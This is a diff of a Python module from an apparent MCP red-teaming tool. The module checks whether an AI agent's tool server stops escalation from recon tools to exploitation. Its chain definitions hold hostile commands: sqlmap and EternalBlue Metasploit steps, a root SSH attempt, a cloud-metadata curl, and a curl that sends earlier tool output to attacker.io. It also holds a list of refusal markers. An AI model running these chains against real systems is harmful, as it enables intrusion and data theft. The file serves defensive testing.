@@ -1,257 +1,197 @@
-"""Cross-tool scope-escalation checks for MCPwn."""
-
 from __future__ import annotations
 
 from dataclasses import dataclass
 from time import perf_counter
+from typing import Any
 
 from mcpwn_red.attacks.base import (
-    AttackBase,
     AttackResult,
-    Severity,
-    ToolReference,
     build_arguments,
-    extract_text_content,
+    build_result,
     find_tool,
+    replace_result_tokens,
 )
-from mcpwn_red.mcp_client import MCPClient, MCPClientConfig, MCPClientError
+from mcpwn_red.mcp_client import MCPClientError
 
 
-@dataclass(frozen=True, slots=True)
-class EscalationStep:
+@dataclass(frozen=True)
+class ChainStep:
     tool_candidates: tuple[str, ...]
-    logical_arguments: dict[str, str]
-    description: str
+    arguments: dict[str, str]
 
 
-@dataclass(frozen=True, slots=True)
-class EscalationChain:
+@dataclass(frozen=True)
+class ScopeChain:
     attack_id: str
     name: str
-    severity: Severity
-    start_tool: EscalationStep
-    escalation_path: tuple[EscalationStep, ...]
-    boundary_expected: bool
+    severity: str
+    description: str
+    step_one: ChainStep
+    step_two: ChainStep
     recommendation: str
 
 
-ESCALATION_CHAINS: tuple[EscalationChain, ...] = (
-    EscalationChain(
-        attack_id="SCP-01",
-        name="Recon To SQL Injection To Shell",
-        severity="critical",
-        start_tool=EscalationStep(("nmap",), {"target": "127.0.0.1", "ports": "80"}, "Authorized recon"),
-        escalation_path=(
-            EscalationStep(("sqlmap",), {"url": "http://127.0.0.1/admin.php?id=1"}, "Injected sqlmap follow-on"),
-            EscalationStep(("shell", "shell_exec", "exec", "command", "bash", "sh"), {"command": "nmap -Pn 192.168.0.0/24"}, "Injected local-LAN shell pivot"),
-        ),
-        boundary_expected=True,
-        recommendation="Attach policy labels to each session and reject tool transitions that exceed the authorized campaign scope.",
-    ),
-    EscalationChain(
-        attack_id="SCP-02",
-        name="Directory Bust To SQLMap To Bridge Pivot",
+CHAINS: tuple[ScopeChain, ...] = (
+    ScopeChain(
+        attack_id="CHAIN-01",
+        name="recon_to_exploit",
         severity="high",
-        start_tool=EscalationStep(
-            ("gobuster",),
-            {"url": "http://127.0.0.1", "wordlist": "/usr/share/wordlists/dirb/common.txt", "threads": "1"},
-            "Authorized directory discovery",
-        ),
-        escalation_path=(
-            EscalationStep(("sqlmap",), {"url": "http://127.0.0.1/login.php?id=1"}, "Injected sqlmap escalation"),
-            EscalationStep(("nmap",), {"target": "172.17.0.1", "ports": "22"}, "Injected bridge-network probe"),
-        ),
-        boundary_expected=True,
-        recommendation="Require operator re-authorization before switching from content discovery into exploitation or local-network scanning.",
+        description="Boundary expected between recon and active SQL exploitation.",
+        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "80"}),
+        step_two=ChainStep(("sqlmap",), {"url": "http://192.0.2.1/?id=1"}),
+        recommendation="Require explicit approval before escalating recon into exploitation tools.",
     ),
-    EscalationChain(
-        attack_id="SCP-03",
-        name="Recon To Metasploit To Shell",
+    ScopeChain(
+        attack_id="CHAIN-02",
+        name="scan_to_shell",
         severity="critical",
-        start_tool=EscalationStep(("nmap",), {"target": "127.0.0.1", "ports": "445"}, "Authorized SMB recon"),
-        escalation_path=(
-            EscalationStep(("metasploit", "msfconsole", "msf"), {"module": "auxiliary/scanner/portscan/tcp", "target": "127.0.0.1"}, "Injected Metasploit escalation"),
-            EscalationStep(("shell", "shell_exec", "exec", "command", "bash", "sh"), {"command": "ip route"}, "Injected route discovery shell"),
-        ),
-        boundary_expected=True,
-        recommendation="Model-facing tool outputs should never be allowed to promote recon into exploitation modules without an explicit approval gate.",
+        description="Boundary expected between passive scan and interactive shell access.",
+        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "22"}),
+        step_two=ChainStep(("shell_exec", "shell", "exec"), {"command": "ssh root@192.0.2.1"}),
+        recommendation="Block shell-capable tools from scan-driven follow-up chains by default.",
     ),
-    EscalationChain(
-        attack_id="SCP-04",
-        name="SQLMap To Shell To Operator LAN",
-        severity="critical",
-        start_tool=EscalationStep(("sqlmap",), {"url": "http://127.0.0.1/?id=1"}, "Authorized SQLi validation"),
-        escalation_path=(
-            EscalationStep(("shell", "shell_exec", "exec", "command", "bash", "sh"), {"command": "nmap -sn 192.168.1.0/24"}, "Injected LAN discovery shell"),
-        ),
-        boundary_expected=True,
-        recommendation="Enforce per-tool risk tiers so exploit tools cannot chain into arbitrary command execution inside one model session.",
-    ),
-    EscalationChain(
-        attack_id="SCP-05",
-        name="Recon To Gobuster To Metadata Fetch",
+    ScopeChain(
+        attack_id="CHAIN-03",
+        name="web_to_localnet",
         severity="high",
-        start_tool=EscalationStep(("nmap",), {"target": "127.0.0.1", "ports": "80"}, "Authorized recon"),
-        escalation_path=(
-            EscalationStep(
-                ("gobuster",),
-                {"url": "http://127.0.0.1", "wordlist": "/usr/share/wordlists/dirb/common.txt", "threads": "1"},
-                "Injected directory bust",
-            ),
-            EscalationStep(
-                ("shell", "shell_exec", "exec", "command", "bash", "sh"),
-                {"command": "curl -fsSL http://169.254.169.254/latest/meta-data/"},
-                "Injected metadata probe",
-            ),
+        description="Boundary expected between an external web target and the operator subnet.",
+        step_one=ChainStep(("gobuster",), {"url": "http://192.0.2.1"}),
+        step_two=ChainStep(("nmap",), {"target": "192.168.0.0/24"}),
+        recommendation="Bind execution scope to the originally authorized target set.",
+    ),
+    ScopeChain(
+        attack_id="CHAIN-04",
+        name="fuzz_to_exfil",
+        severity="critical",
+        description="Boundary expected between fuzzing and outbound exfiltration.",
+        step_one=ChainStep(("ffuf",), {"url": "http://192.0.2.1/FUZZ"}),
+        step_two=ChainStep(("curl",), {"url": "http://attacker.io/?data=RESULT"}),
+        recommendation="Block outbound requests that use prior tool output as remote data.",
+    ),
+    ScopeChain(
+        attack_id="CHAIN-05",
+        name="enum_to_metasploit",
+        severity="critical",
+        description="Boundary expected between vuln enumeration and weaponized exploitation.",
+        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "445"}),
+        step_two=ChainStep(
+            ("metasploit", "msfconsole"),
+            {"exploit": "ms17_010_eternalblue", "rhosts": "192.0.2.1"},
         ),
-        boundary_expected=True,
-        recommendation="Tie follow-on tool calls to an operator-approved call graph instead of allowing unconstrained model-directed pivots.",
+        recommendation="Require explicit operator confirmation for exploit-framework transitions.",
     ),
 )
 
-_POLICY_BLOCK_MARKERS = ("blocked", "not authorized", "scope", "denied", "disallowed", "policy")
+REFUSAL_MARKERS = ("denied", "not allowed", "refused", "blocked", "unavailable")
 
 
-class ToolScopeEscalationTester(AttackBase):
+class ScopeEscalationTester:
     module = "scope"
 
-    def __init__(self, client_config: MCPClientConfig) -> None:
-        self.client_config = client_config
-
     @classmethod
-    def describe(cls) -> list[dict[str, str]]:
+    def catalog(cls) -> list[dict[str, str]]:
         return [
             {
                 "id": chain.attack_id,
                 "module": cls.module,
-                "name": chain.name,
-                "description": " -> ".join(step.description for step in (chain.start_tool, *chain.escalation_path)),
+                "severity": chain.severity,
+                "description": chain.description,
             }
-            for chain in ESCALATION_CHAINS
+            for chain in CHAINS
         ]
 
-    async def run(self) -> list[AttackResult]:
-        async with MCPClient(self.client_config) as client:
-            tools = await client.list_tool_refs()
-            results: list[AttackResult] = []
-            for chain in ESCALATION_CHAINS:
-                results.append(await self._run_chain(client, tools, chain))
-            return results
+    async def run(self, client: Any) -> list[AttackResult]:
+        tools = await client.list_tools()
+        results: list[AttackResult] = []
+        for chain in CHAINS:
+            results.append(await self.run_chain(client, tools, chain))
+        return results
 
-    async def _run_chain(
+    async def run_chain(
         self,
-        client: MCPClient,
-        tools: list[ToolReference],
-        chain: EscalationChain,
+        client: Any,
+        tools: list[dict[str, Any]],
+        chain: ScopeChain,
     ) -> AttackResult:
         started_at = perf_counter()
-        start_tool = find_tool(tools, chain.start_tool.tool_candidates)
-        if start_tool is None:
-            return self.build_result(
+        first_tool = find_tool(tools, chain.step_one.tool_candidates)
+        if first_tool is None:
+            return build_result(
                 attack_id=chain.attack_id,
                 name=chain.name,
+                module=self.module,
                 status="UNKNOWN",
                 severity=chain.severity,
-                evidence=f"Start tool family {chain.start_tool.tool_candidates!r} is not available.",
+                evidence=f"{chain.step_one.tool_candidates[0]} unavailable for step 1.",
                 started_at=started_at,
                 recommendation=chain.recommendation,
             )
-
-        start_arguments = build_arguments(start_tool, chain.start_tool.logical_arguments)
         try:
-            start_result = await client.call_tool(start_tool.name, start_arguments)
+            first_output = await client.call_tool(
+                first_tool["name"],
+                build_arguments(first_tool, chain.step_one.arguments),
+            )
         except MCPClientError as exc:
-            return self.build_result(
+            return build_result(
                 attack_id=chain.attack_id,
                 name=chain.name,
+                module=self.module,
                 status="ERROR",
                 severity=chain.severity,
-                evidence=f"Start step {start_tool.name!r} failed: {exc}",
+                evidence=str(exc),
                 started_at=started_at,
                 recommendation=chain.recommendation,
             )
 
-        start_text = extract_text_content(start_result)
-        if start_result.isError and not start_text:
-            return self.build_result(
+        second_tool = find_tool(tools, chain.step_two.tool_candidates)
+        if second_tool is None:
+            return build_result(
                 attack_id=chain.attack_id,
                 name=chain.name,
-                status="UNKNOWN",
+                module=self.module,
+                status="PASS",
                 severity=chain.severity,
-                evidence=f"Start step {start_tool.name!r} returned an empty error response.",
+                evidence="Unsafe step 2 tool is unavailable.",
                 started_at=started_at,
                 recommendation=chain.recommendation,
             )
 
-        trail = [f"start={start_tool.name!r} args={start_arguments!r} response={start_text!r}"]
-        for step in chain.escalation_path:
-            step_tool = find_tool(tools, step.tool_candidates)
-            if step_tool is None:
-                return self.build_result(
-                    attack_id=chain.attack_id,
-                    name=chain.name,
-                    status="UNKNOWN",
-                    severity=chain.severity,
-                    evidence="; ".join(trail + [f"missing escalation tool family {step.tool_candidates!r}"]),
-                    started_at=started_at,
-                    recommendation=chain.recommendation,
-                )
+        step_two_args = {
+            key: replace_result_tokens(value, first_output)
+            for key, value in chain.step_two.arguments.items()
+        }
+        try:
+            second_output = await client.call_tool(
+                second_tool["name"],
+                build_arguments(second_tool, step_two_args),
+            )
+        except MCPClientError as exc:
+            return build_result(
+                attack_id=chain.attack_id,
+                name=chain.name,
+                module=self.module,
+                status="PASS",
+                severity=chain.severity,
+                evidence=str(exc),
+                started_at=started_at,
+                recommendation=chain.recommendation,
+            )
 
-            step_arguments = build_arguments(step_tool, step.logical_arguments)
-            try:
-                step_result = await client.call_tool(step_tool.name, step_arguments)
-            except MCPClientError as exc:
-                lower = str(exc).lower()
-                if any(marker in lower for marker in _POLICY_BLOCK_MARKERS):
-                    return self.build_result(
-                        attack_id=chain.attack_id,
-                        name=chain.name,
-                        status="PASS",
-                        severity=chain.severity,
-                        evidence="; ".join(trail + [f"blocked escalation at {step_tool.name!r}: {exc}"]),
-                        started_at=started_at,
-                        recommendation=chain.recommendation,
-                    )
-                return self.build_result(
-                    attack_id=chain.attack_id,
-                    name=chain.name,
-                    status="ERROR",
-                    severity=chain.severity,
-                    evidence="; ".join(trail + [f"escalation step {step_tool.name!r} failed unexpectedly: {exc}"]),
-                    started_at=started_at,
-                    recommendation=chain.recommendation,
-                )
-
-            step_text = extract_text_content(step_result)
-            trail.append(f"step={step_tool.name!r} args={step_arguments!r} response={step_text!r}")
-            lower_text = step_text.lower()
-            if step_result.isError and any(marker in lower_text for marker in _POLICY_BLOCK_MARKERS):
-                return self.build_result(
-                    attack_id=chain.attack_id,
-                    name=chain.name,
-                    status="PASS",
-                    severity=chain.severity,
-                    evidence="; ".join(trail),
-                    started_at=started_at,
-                    recommendation=chain.recommendation,
-                )
-            if chain.boundary_expected:
-                return self.build_result(
-                    attack_id=chain.attack_id,
-                    name=chain.name,
-                    status="FAIL",
-                    severity=chain.severity,
-                    evidence="; ".join(trail),
-                    started_at=started_at,
-                    recommendation=chain.recommendation,
-                )
-
-        return self.build_result(
+        if any(marker in second_output.lower() for marker in REFUSAL_MARKERS):
+            status = "PASS"
+        else:
+            status = "FAIL"
+        evidence = (
+            f"step1={first_tool['name']} output={first_output!r}; "
+            f"step2={second_tool['name']} output={second_output!r}"
+        )
+        return build_result(
             attack_id=chain.attack_id,
             name=chain.name,
-            status="UNKNOWN",
+            module=self.module,
+            status=status,
             severity=chain.severity,
-            evidence="; ".join(trail + ["chain completed without a clear boundary signal"]),
+            evidence=evidence,
             started_at=started_at,
             recommendation=chain.recommendation,
         )
